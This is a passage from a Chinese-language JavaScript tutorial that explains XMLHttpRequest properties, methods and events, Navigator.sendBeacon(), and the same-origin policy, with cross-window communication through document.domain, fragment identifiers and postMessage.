      var xhr = new XMLHttpRequest();
      xhr.open('GET', '/path/to/image.png', true);
      xhr.responseType = 'arraybuffer';
   
      xhr.onload = function(e) {
        var uInt8Array = new Uint8Array(this.response);
        for (var i = 0, len = uInt8Array.length; i < len; ++i) {
          // var byte = uInt8Array[i];
        }
      };
   
      xhr.send();

   如果将这个属性设为 ``json`` ，浏览器就会自动对返回数据调用 ``JSON.parse()`` 方法。也就是说，从 ``xhr.response`` 属性（注意，不是 ``xhr.responseText`` 属性）得到的不是文本，而是一个 JSON 对象。

XMLHttpRequest.responseText
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.responseText`` 属性返回从服务器接收到的字符串，该属性为只读。只有 HTTP 请求完成接收以后，该属性才会包含完整的数据。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('GET', '/server', true);
   
      xhr.responseType = 'text';
      xhr.onload = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
          console.log(xhr.responseText);
        }
      };
   
      xhr.send(null);

XMLHttpRequest.responseXML
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.responseXML`` 属性返回从服务器接收到的 HTML 或 XML 文档对象，该属性为只读。如果本次请求没有成功，或者收到的数据不能被解析为 XML 或 HTML，该属性等于 ``null`` 。

   该属性生效的前提是 HTTP 回应的 ``Content-Type`` 头信息等于 ``text/xml`` 或 ``application/xml`` 。这要求在发送请求前， ``XMLHttpRequest.responseType`` 属性要设为 ``document`` 。如果 HTTP 回应的 ``Content-Type`` 头信息不等于 ``text/xml`` 和 ``application/xml`` ，但是想从 ``responseXML`` 拿到数据（即把数据按照 DOM 格式解析），那么需要手动调用 ``XMLHttpRequest.overrideMimeType()`` 方法，强制进行 XML 解析。

   该属性得到的数据，是直接解析后的文档 DOM 树。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('GET', '/server', true);
   
      xhr.responseType = 'document';
      xhr.overrideMimeType('text/xml');
   
      xhr.onload = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
          console.log(xhr.responseXML);
        }
      };
   
      xhr.send(null);

XMLHttpRequest.responseURL
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.responseURL`` 属性是字符串，表示发送数据的服务器的网址。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'http://example.com/test', true);
      xhr.onload = function () {
        // 返回 http://example.com/test
        console.log(xhr.responseURL);
      };
      xhr.send(null);

   注意，这个属性的值与 ``open()`` 方法指定的请求网址不一定相同。如果服务器端发生跳转，这个属性返回最后实际返回数据的网址。另外，如果原始 URL 包括锚点（fragment），该属性会把锚点剥离。

XMLHttpRequest.status，XMLHttpRequest.statusText
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.status`` 属性返回一个整数，表示服务器回应的 HTTP 状态码。一般来说，如果通信成功的话，这个状态码是200；如果服务器没有返回状态码，那么这个属性默认是200。请求发出之前，该属性为 ``0`` 。该属性只读。

   - 200, OK，访问正常
   - 301, Moved Permanently，永久移动
   - 302, Moved temporarily，暂时移动
   - 304, Not Modified，未修改
   - 307, Temporary Redirect，暂时重定向
   - 401, Unauthorized，未授权
   - 403, Forbidden，禁止访问
   - 404, Not Found，未发现指定网址
   - 500, Internal Server Error，服务器发生错误

   基本上，只有2xx和304的状态码，表示服务器返回是正常状态。

   .. code:: javascript

      if (xhr.readyState === 4) {
        if ( (xhr.status >= 200 && xhr.status < 300)
          || (xhr.status === 304) ) {
          // 处理服务器的返回数据
        } else {
          // 出错
        }
      }

    ``XMLHttpRequest.statusText`` 属性返回一个字符串，表示服务器发送的状态提示。不同于 ``status`` 属性，该属性包含整个状态信息，比如“OK”和“Not Found”。在请求发送之前（即调用 ``open()`` 方法之前），该属性的值是空字符串；如果服务器没有返回状态提示，该属性的值默认为“OK”。该属性为只读属性。

XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.timeout`` 属性返回一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。

    ``XMLHttpRequestEventTarget.ontimeout`` 属性用于设置一个监听函数，如果发生 timeout 事件，就会执行这个监听函数。

   下面是一个例子。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      var url = '/server';
   
      xhr.ontimeout = function () {
        console.error('The request for ' + url + ' timed out.');
      };
   
      xhr.onload = function() {
        if (xhr.readyState === 4) {
          if (xhr.status === 200) {
            // 处理服务器返回的数据
          } else {
            console.error(xhr.statusText);
          }
        }
      };
   
      xhr.open('GET', url, true);
      // 指定 10 秒钟超时
      xhr.timeout = 10 * 1000;
      xhr.send(null);

事件监听属性
~~~~~~~~~~

   XMLHttpRequest 对象可以对以下事件指定监听函数。

   - XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数
   - XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数
   - XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了 ``abort()`` 方法）的监听函数
   - XMLHttpRequest.onerror：error 事件（请求失败）的监听函数
   - XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数
   - XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数
   - XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数

   下面是一个例子。

   .. code:: javascript

      xhr.onload = function() {
       var responseText = xhr.responseText;
       console.log(responseText);
       // process the response.
      };
   
      xhr.onabort = function () {
        console.log('The request was aborted');
      };
   
      xhr.onprogress = function (event) {
        console.log(event.loaded);
        console.log(event.total);
      };
   
      xhr.onerror = function() {
        console.log('There was an error!');
      };

    ``progress`` 事件的监听函数有一个事件对象参数，该对象有三个属性： ``loaded`` 属性返回已经传输的数据量， ``total`` 属性返回总的数据量， ``lengthComputable`` 属性返回一个布尔值，表示加载的进度是否可以计算。所有这些监听函数里面，只有 ``progress`` 事件的监听函数有参数，其他函数都没有参数。

   注意，如果发生网络错误（比如服务器无法连通）， ``onerror`` 事件无法获取报错信息。也就是说，可能没有错误对象，所以这样只能显示报错的提示。

XMLHttpRequest.withCredentials
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.withCredentials`` 属性是一个布尔值，表示跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中，默认为 ``false`` ，即向 ``example.com`` 发出跨域请求时，不会发送 ``example.com`` 设置在本机上的 Cookie（如果有的话）。

   如果需要跨域 AJAX 请求发送 Cookie，需要 ``withCredentials`` 属性设为 ``true`` 。注意，同源的请求不需要设置这个属性。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'http://example.com/', true);
      xhr.withCredentials = true;
      xhr.send(null);

   为了让这个属性生效，服务器必须显式返回 ``Access-Control-Allow-Credentials`` 这个头信息。

   .. code:: javascript

      Access-Control-Allow-Credentials: true

    ``withCredentials`` 属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果 ``withCredentials`` 属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。

   注意，脚本总是遵守同源政策，无法从 ``document.cookie`` 或者 HTTP 回应的头信息之中，读取跨域的 Cookie， ``withCredentials`` 属性不影响这一点。

XMLHttpRequest.upload
~~~~~~~~~~~~~~~~~~~~~~

   XMLHttpRequest 不仅可以发送请求，还可以发送文件，这就是 AJAX 文件上传。发送文件以后，通过 ``XMLHttpRequest.upload`` 属性可以得到一个对象，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。

   假定网页上有一个 ``<progress>`` 元素。

   .. code:: http

      <progress min="0" max="100" value="0">0% complete</progress>

   文件上传时，对 ``upload`` 属性指定 ``progress`` 事件的监听函数，即可获得上传的进度。

   .. code:: javascript

      function upload(blobOrFile) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/server', true);
        xhr.onload = function (e) {};
   
        var progressBar = document.querySelector('progress');
        xhr.upload.onprogress = function (e) {
          if (e.lengthComputable) {
            progressBar.value = (e.loaded / e.total) * 100;
            // 兼容不支持 <progress> 元素的老式浏览器
            progressBar.textContent = progressBar.value;
          }
        };
   
        xhr.send(blobOrFile);
      }
   
      upload(new Blob(['hello world'], {type: 'text/plain'}));

XMLHttpRequest 的实例方法
-----------------------


XMLHttpRequest.open()
~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.open()`` 方法用于指定 HTTP 请求的参数，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受五个参数。

   .. code:: javascript

      void open(
         string method,
         string url,
         optional boolean async,
         optional string user,
         optional string password
      );

   -  ``method`` ：表示 HTTP 动词方法，比如 ``GET`` 、 ``POST`` 、 ``PUT`` 、 ``DELETE`` 、 ``HEAD`` 等。
   -  ``url`` : 表示请求发送目标 URL。
   -  ``async`` : 布尔值，表示请求是否为异步，默认为 ``true`` 。如果设为 ``false`` ，则 ``send()`` 方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为 ``false`` 。
   -  ``user`` ：表示用于认证的用户名，默认为空字符串。该参数可选。
   -  ``password`` ：表示用于认证的密码，默认为空字符串。该参数可选。

   注意，如果对使用过 ``open()`` 方法的 AJAX 请求，再次使用这个方法，等同于调用 ``abort()`` ，即终止请求。

   下面发送 POST 请求的例子。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('POST', encodeURI('someURL'));

XMLHttpRequest.send()
~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.send()`` 方法用于实际发出 HTTP 请求。它的参数是可选的，如果不带参数，就表示 HTTP 请求只有一个 URL，没有数据体，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。

   下面是 GET 请求的例子。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('GET',
        'http://www.example.com/?id=' + encodeURIComponent(id),
        true
      );
      xhr.send(null);

   上面代码中， ``GET`` 请求的参数，作为查询字符串附加在 URL 后面。

   下面是发送 POST 请求的例子。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      var data = 'email='
        + encodeURIComponent(email)
        + '&password='
        + encodeURIComponent(password);
   
      xhr.open('POST', 'http://www.example.com', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(data);

   注意，所有 XMLHttpRequest 的监听事件，都必须在 ``send()`` 方法调用之前设定。

    ``send`` 方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。

   .. code:: javascript

      void send();
      void send(ArrayBufferView data);
      void send(Blob data);
      void send(Document data);
      void send(String data);
      void send(FormData data);

   如果 ``send()`` 发送 DOM 对象，在发送之前，数据会先被串行化。如果发送二进制数据，最好是发送 ``ArrayBufferView`` 或 ``Blob`` 对象，这使得通过 Ajax 上传文件成为可能。

   下面是发送表单数据的例子。 ``FormData`` 对象可以用于构造表单数据。

   .. code:: javascript

      var formData = new FormData();
   
      formData.append('username', '张三');
      formData.append('email', 'zhangsan@example.com');
      formData.append('birthDate', 1940);
   
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/register');
      xhr.send(formData);

   上面代码中， ``FormData`` 对象构造了表单数据，然后使用 ``send()`` 方法发送。它的效果与发送下面的表单数据是一样的。

   .. code:: html

      <form id='registration' name='registration' action='/register'>
        <input type='text' name='username' value='张三'>
        <input type='email' name='email' value='zhangsan@example.com'>
        <input type='number' name='birthDate' value='1940'>
        <input type='submit' onclick='return sendForm(this.form);'>
      </form>

   下面的例子是使用 ``FormData`` 对象加工表单数据，然后再发送。

   .. code:: javascript

      function sendForm(form) {
        var formData = new FormData(form);
        formData.append('csrf', 'e69a18d7db1286040586e6da1950128c');
   
        var xhr = new XMLHttpRequest();
        xhr.open('POST', form.action, true);
        xhr.onload = function() {
          // ...
        };
        xhr.send(formData);
   
        return false;
      }
   
      var form = document.querySelector('#registration');
      sendForm(form);

XMLHttpRequest.setRequestHeader()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.setRequestHeader()`` 方法用于设置浏览器发送的 HTTP 请求的头信息。该方法必须在 ``open()`` 之后、 ``send()`` 之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。

   该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。

   .. code:: javascript

      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
      xhr.send(JSON.stringify(data));

   上面代码首先设置头信息 ``Content-Type`` ，表示发送 JSON 格式的数据；然后设置 ``Content-Length`` ，表示数据长度；最后发送 JSON 数据。

XMLHttpRequest.overrideMimeType()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.overrideMimeType()`` 方法用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是 ``text/xml`` ，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成 ``text/plain`` ，这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。

   .. code:: javascript

      xhr.overrideMimeType('text/plain')

   注意，该方法必须在 ``send()`` 方法之前调用。

   修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用 ``responseType`` 属性告诉服务器，就像下面的例子。只有在服务器无法返回某种数据类型时，才使用 ``overrideMimeType()`` 方法。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.onload = function(e) {
        var arraybuffer = xhr.response;
        // ...
      }
      xhr.open('GET', url);
      xhr.responseType = 'arraybuffer';
      xhr.send();

XMLHttpRequest.getResponseHeader()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.getResponseHeader()`` 方法返回 HTTP 头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，返回 ``null`` 。该方法的参数不区分大小写。

   .. code:: javascript

      function getHeaderTime() {
        console.log(this.getResponseHeader("Last-Modified"));
      }
   
      var xhr = new XMLHttpRequest();
      xhr.open('HEAD', 'yourpage.html');
      xhr.onload = getHeaderTime;
      xhr.send();

   如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。

XMLHttpRequest.getAllResponseHeaders()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.getAllResponseHeaders()`` 方法返回一个字符串，表示服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用 ``CRLF`` 分隔（回车+换行），如果没有收到服务器回应，该属性为 ``null`` 。如果发生网络错误，该属性为空字符串。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'foo.txt', true);
      xhr.send();
   
      xhr.onreadystatechange = function () {
        if (this.readyState === 4) {
          var headers = xhr.getAllResponseHeaders();
        }
      }

   上面代码用于获取服务器返回的所有头信息。它可能是下面这样的字符串。

   .. code:: http

      date: Fri, 08 Dec 2017 21:04:30 GMT\r\n
      content-encoding: gzip\r\n
      x-content-type-options: nosniff\r\n
      server: meinheld/0.6.1\r\n
      x-frame-options: DENY\r\n
      content-type: text/html; charset=utf-8\r\n
      connection: keep-alive\r\n
      strict-transport-security: max-age=63072000\r\n
      vary: Cookie, Accept-Encoding\r\n
      content-length: 6502\r\n
      x-xss-protection: 1; mode=block\r\n

   然后，对这个字符串进行处理。

   .. code:: javascript

      var arr = headers.trim().split(/[\r\n]+/);
      var headerMap = {};
   
      arr.forEach(function (line) {
        var parts = line.split(': ');
        var header = parts.shift();
        var value = parts.join(': ');
        headerMap[header] = value;
      });
   
      headerMap['content-length'] // "6502"

XMLHttpRequest.abort()
~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.abort()`` 方法用来终止已经发出的 HTTP 请求。调用这个方法以后， ``readyState`` 属性变为 ``4`` ， ``status`` 属性变为 ``0`` 。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'http://www.example.com/page.php', true);
      setTimeout(function () {
        if (xhr) {
          xhr.abort();
          xhr = null;
        }
      }, 5000);

   上面代码在发出5秒之后，终止一个 AJAX 请求。

XMLHttpRequest 实例的事件
-----------------------


readyStateChange 事件
~~~~~~~~~~~~~~~~~~~~

    ``readyState`` 属性的值发生改变，就会触发 readyStateChange 事件。

   我们可以通过 ``onReadyStateChange`` 属性，指定这个事件的监听函数，对不同状态进行不同处理。尤其是当状态变为 ``4`` 的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。

progress 事件
~~~~~~~~~~~~

   上传文件时，XMLHttpRequest 实例对象本身和实例的 ``upload`` 属性，都有一个 ``progress`` 事件，会不断返回上传的进度。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
   
      function updateProgress (oEvent) {
        if (oEvent.lengthComputable) {
          var percentComplete = oEvent.loaded / oEvent.total;
        } else {
          console.log('无法计算进展');
        }
      }
   
      xhr.addEventListener('progress', updateProgress);
   
      xhr.open();

load 事件、error 事件、abort 事件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   load 事件表示服务器传来的数据接收完毕，error 事件表示请求出错，abort 事件表示请求被中断（比如用户取消请求）。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
   
      xhr.addEventListener('load', transferComplete);
      xhr.addEventListener('error', transferFailed);
      xhr.addEventListener('abort', transferCanceled);
   
      xhr.open();
   
      function transferComplete() {
        console.log('数据接收完毕');
      }
   
      function transferFailed() {
        console.log('数据接收出错');
      }
   
      function transferCanceled() {
        console.log('用户取消接收');
      }

loadend 事件
~~~~~~~~~~~

    ``abort`` 、 ``load`` 和 ``error`` 这三个事件，会伴随一个 ``loadend`` 事件，表示请求结束，但不知道其是否成功。

   .. code:: javascript

      xhr.addEventListener('loadend', loadEnd);
   
      function loadEnd(e) {
        console.log('请求结束，状态未知');
      }

timeout 事件
~~~~~~~~~~~

   服务器超过指定时间还没有返回结果，就会触发 timeout 事件，具体的例子参见 ``timeout`` 属性一节。

Navigator.sendBeacon()
-----------------------

   用户卸载网页的时候，有时需要向服务器发一些数据。很自然的做法是在 ``unload`` 事件或 ``beforeunload`` 事件的监听函数里面，使用 ``XMLHttpRequest`` 对象发送数据。但是，这样做不是很可靠，因为 ``XMLHttpRequest`` 对象是异步发送，很可能在它即将发送的时候，页面已经卸载了，从而导致发送取消或者发送失败。

   解决方法就是 ``unload`` 事件里面，加一些很耗时的同步操作。这样就能留出足够的时间，保证异步 AJAX 能够发送成功。

   .. code:: javascript

      function log() {
        let xhr = new XMLHttpRequest();
        xhr.open('post', '/log', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('foo=bar');
      }
   
      window.addEventListener('unload', function(event) {
        log();
   
        // a time-consuming operation
        for (let i = 1; i < 10000; i++) {
          for (let m = 1; m < 10000; m++) { continue; }
        }
      });

   上面代码中，强制执行了一次双重循环，拖长了 ``unload`` 事件的执行时间，导致异步 AJAX 能够发送成功。

   类似的还可以使用 ``setTimeout()`` 。下面是追踪用户点击的例子。

   .. code:: javascript

      // HTML 代码如下
      // <a id="target" href="https://baidu.com">click</a>
      const clickTime = 350;
      const theLink = document.getElementById('target');
   
      function log() {
        let xhr = new XMLHttpRequest();
        xhr.open('post', '/log', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('foo=bar');
      }
   
      theLink.addEventListener('click', function (event) {
        event.preventDefault();
        log();
   
        setTimeout(function () {
          window.location.href = theLink.getAttribute('href');
        }, clickTime);
      });

   上面代码使用 ``setTimeout()`` ，拖延了350毫秒，才让页面跳转，因此使得异步 AJAX 有时间发出。

   这些做法的共同问题是，卸载的时间被硬生生拖长了，后面页面的加载被推迟了，用户体验不好。

   为了解决这个问题，浏览器引入了 ``Navigator.sendBeacon()`` 方法。这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。

   .. code:: javascript

      window.addEventListener('unload', logData, false);
   
      function logData() {
        navigator.sendBeacon('/log', JSON.stringify({
          some: "data"
        }));
      }

    ``Navigator.sendBeacon()`` 方法接受两个参数，第一个参数是目标服务器的 URL，第二个参数是所要发送的数据（可选），可以是任意类型（字符串、表单对象、二进制对象等等）。

   .. code:: javascript

      navigator.sendBeacon(url, data)

   这个方法的返回值是一个布尔值，成功发送数据为 ``true`` ，否则为 ``false`` 。

   该方法发送数据的 HTTP 方法是 POST，可以跨域，类似于表单提交数据。它不能指定回调函数。

   下面是一个例子。

   .. code:: javascript

      // HTML 代码如下
      // <body onload="analytics('start')" onunload="analytics('end')">
   
      function analytics(state) {
        if (!navigator.sendBeacon) return;
   
        var URL = 'http://example.com/analytics';
        var data = 'state=' + state + '&location=' + window.location;
        navigator.sendBeacon(URL, data);
      }

   该方法不允许自定义 HTTP 标头，为了以“application/json”的形式发送数据，可以使用 Blob 对象。

   .. code:: javascript

      const blob = new Blob(
        [ JSON.stringify({ some: "data" }) ],
        { type: 'application/json; charset=UTF-8' }
      );
      navigator.sendBeacon('/log', blob));

   这个方法的优先级较低，不会占用页面资源。一般是在浏览器空闲的时候，才会发送。

/🟠 同源限制
===========

   浏览器安全的基石是“同源政策”（[same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy)）。很多开发者都知道这一点，但了解得不全面。

概述
---


含义
~~~

   1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。

   最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是“三个相同”。

   > - 协议相同
   > - 域名相同
   > - 端口相同（这点可以忽略，详见下文）

   举例来说， ``http://www.example.com/dir/page.html`` 这个网址，协议是 ``http://`` ，域名是 ``www.example.com`` ，端口是 ``80`` （默认端口可以省略），它的同源情况如下。

   -  ``http://www.example.com/dir2/other.html`` ：同源
   -  ``http://example.com/dir/other.html`` ：不同源（域名不同）
   -  ``http://v2.www.example.com/dir/other.html`` ：不同源（域名不同）
   -  ``http://www.example.com:81/dir/other.html`` ：不同源（端口不同）
   -  ``https://www.example.com/dir/page.html`` ：不同源（协议不同）

   注意，标准规定端口不同的网址不是同源（比如8000端口和8001端口不是同源），但是浏览器没有遵守这条规定。实际上，同一个网域的不同端口，是可以互相读取 Cookie 的。

目的
~~~

   同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。

   设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私就泄漏了。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。

   由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。

限制范围
~~~~~~~

   随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。

   > （1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。
   >
   > （2） 无法接触非同源网页的 DOM。
   >
   > （3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。

   另外，通过 JavaScript 脚本可以拿到其他窗口的 ``window`` 对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的 ``window`` 对象的九个属性和四个方法。

   - window.closed
   - window.frames
   - window.length
   - window.location
   - window.opener
   - window.parent
   - window.self
   - window.top
   - window.window
   - window.blur()
   - window.close()
   - window.focus()
   - window.postMessage()

   上面的九个属性之中，只有 ``window.location`` 是可读写的，其他八个全部都是只读。而且，即使是 ``location`` 对象，非同源的情况下，也只允许调用 ``location.replace()`` 方法和写入 ``location.href`` 属性。

   虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。

Cookie
-------

   Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置 ``document.domain`` 共享 Cookie。

   举例来说，A 网页的网址是 ``http://w1.example.com/a.html`` ，B 网页的网址是 ``http://w2.example.com/b.html`` ，那么只要设置相同的 ``document.domain`` ，两个网页就可以共享 Cookie。因为浏览器通过 ``document.domain`` 属性来检查是否同源。

   .. code:: javascript

      // 两个网页都需要设置
      document.domain = 'example.com';

   注意，A 和 B 两个网页都需要设置 ``document.domain`` 属性，才能达到同源的目的。因为设置 ``document.domain`` 的同时，会把端口重置为 ``null`` ，因此如果只设置一个网页的 ``document.domain`` ，会导致两个网址的端口不同，还是达不到同源的目的。

   现在，A 网页通过脚本设置一个 Cookie。

   .. code:: javascript

      document.cookie = "test1=hello";

   B 网页就可以读到这个 Cookie。

   .. code:: javascript

      var allCookie = document.cookie;

   注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。

   另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如 ``example.com`` 。

   .. code:: http

      Set-Cookie: key=value; domain=example.com; path=/

   这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。

iframe 和多窗口通信
-----------------

    ``iframe`` 元素可以在当前网页之中，嵌入其他网页。每个 ``iframe`` 元素形成自己的窗口，即有自己的 ``window`` 对象。 ``iframe`` 窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。

   比如，父窗口运行下面的命令，如果 ``iframe`` 窗口不是同源，就会报错。

   .. code:: javascript

      document
      .getElementById("myIFrame")
      .contentWindow
      .document
      // Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.

   上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。

   反之亦然，子窗口获取主窗口的 DOM 也会报错。

   .. code:: javascript

      window.parent.document.body
      // 报错

   这种情况不仅适用于 ``iframe`` 窗口，还适用于 ``window.open`` 方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。

   如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的 ``document.domain`` 属性，就可以规避同源政策，拿到 DOM。

   对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。

   > - 片段识别符（fragment identifier）
   > - 跨文档通信API（Cross-document messaging）

片段识别符
~~~~~~~~

   片段标识符（fragment identifier）指的是，URL 的 ``#`` 号后面的部分，比如 ``http://example.com/x.html#fragment`` 的 ``#fragment`` 。如果只是改变片段标识符，页面不会重新刷新。

   父窗口可以把信息，写入子窗口的片段标识符。

   .. code:: javascript

      var src = originURL + '#' + data;
      document.getElementById('myIFrame').src = src;

   上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。

   子窗口通过监听 ``hashchange`` 事件得到通知。

   .. code:: javascript

      window.onhashchange = checkMessage;
   
      function checkMessage() {
        var message = window.location.hash;
        // ...
      }

   同样的，子窗口也可以改变父窗口的片段标识符。

   .. code:: javascript

      parent.location.href = target + '#' + hash;

window.postMessage()
~~~~~~~~~~~~~~~~~~~~~

   上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。

   这个 API 为 ``window`` 对象新增了一个 ``window.postMessage`` 方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口 ``aaa.com`` 向子窗口 ``bbb.com`` 发消息，调用 ``postMessage`` 方法就可以了。

   .. code:: javascript

      // 父窗口打开一个子窗口
      var popup = window.open('http://bbb.com', 'title');
      // 父窗口向子窗口发消息
      popup.postMessage('Hello World!', 'http://bbb.com');

    ``postMessage`` 方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为 ``*`` ，表示不限制域名，向所有窗口发送。

   子窗口向父窗口发送消息的写法类似。

   .. code:: javascript

      // 子窗口向父窗口发消息
      window.opener.postMessage('Nice to see you', 'http://aaa.com');

   父窗口和子窗口都可以通过 ``message`` 事件，监听对方的消息。

   .. code:: javascript

      // 父窗口和子窗口都可以用下面的代码，
      // 监听 message 消息
      window.addEventListener('message', function (e) {
        console.log(e.data);
      },false);

    ``message`` 事件的参数是事件对象 ``event`` ，提供以下三个属性。

   > -  ``event.source`` ：发送消息的窗口
   > -  ``event.origin`` : 消息发送者的源（origin），即协议、域名、端口。
   > -  ``event.data`` : 消息内容

   下面的例子是，子窗口通过 ``event.source`` 属性引用父窗口，然后发送消息。

   .. code:: javascript

      window.addEventListener('message', receiveMessage);
      function receiveMessage(event) {
        event.source.postMessage('Nice to see you!', '*');
      }

   上面代码有几个地方需要注意。首先， ``receiveMessage`` 函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次， ``postMessage`` 方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。

    ``event.origin`` 属性可以过滤非许可地址发来的消息。

   .. code:: javascript

      window.addEventListener('message', receiveMessage);
      function receiveMessage(event) {
        if (event.origin !== 'http://aaa.com') return;
        if (event.data === 'Hello World') {
          event.source.postMessage('Hello', event.origin);
        } else {
          console.log(event.data);
        }
      }

